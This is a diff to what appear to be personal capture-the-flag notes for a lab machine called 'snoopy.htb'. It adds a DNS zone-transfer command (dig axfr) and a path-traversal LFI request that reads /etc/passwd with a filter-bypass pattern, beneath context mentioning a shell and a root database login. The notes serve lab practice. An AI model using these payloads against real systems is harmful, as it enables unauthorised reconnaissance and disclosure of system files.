@@ -133,3 +133,20 @@ this will get a shell to extract cookies.
 ```
 mysql --host=db --user=root --password=root cacti -e "show table"
 ```
+
+### DNS zone transfer
+
+
+https://www.acunetix.com/blog/articles/dns-zone-transfers-axfr/
+
+dig command syntaxt snoopy.htb @<snoopy actual ip>
+`dig axfr snoopy.htb @10.10.11.212`
+
+
+### LFI vulnerability
+
+GET /download?file=....//....//....//....//etc/passwd HTTP/1.1
+
+
+
+
